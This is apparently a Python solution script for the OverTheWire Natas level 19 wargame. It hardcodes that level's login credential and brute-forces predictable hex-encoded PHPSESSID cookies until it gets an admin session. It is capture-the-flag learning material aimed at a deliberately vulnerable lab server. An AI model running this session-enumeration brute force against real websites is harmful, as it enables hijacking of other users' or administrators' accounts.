import requests
from requests.auth import HTTPBasicAuth
from binascii import hexlify as hex

Auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

uri="http://natas19.natas.labs.overthewire.org/index.php"

for i in range(0,640):
    #Build our Admin PHPSESSID
    payload=dict(PHPSESSID=hex(('{}-admin'.format(i)).encode('utf-8')).decode('utf-8'))
    # r = requests.post(uri,data=data,auth=Auth)
    r = requests.post(uri,cookies=payload,auth=Auth)
    if i % 10 == 0:
        print("{} - still going".format(i,r.status_code))
    if "You are an admin" in r.text:
        print("Session found: {}".format(i))
        print(r.text)
        break

    # print(bytes.fromhex(r.cookies['PHPSESSID']).decode('utf-8'))
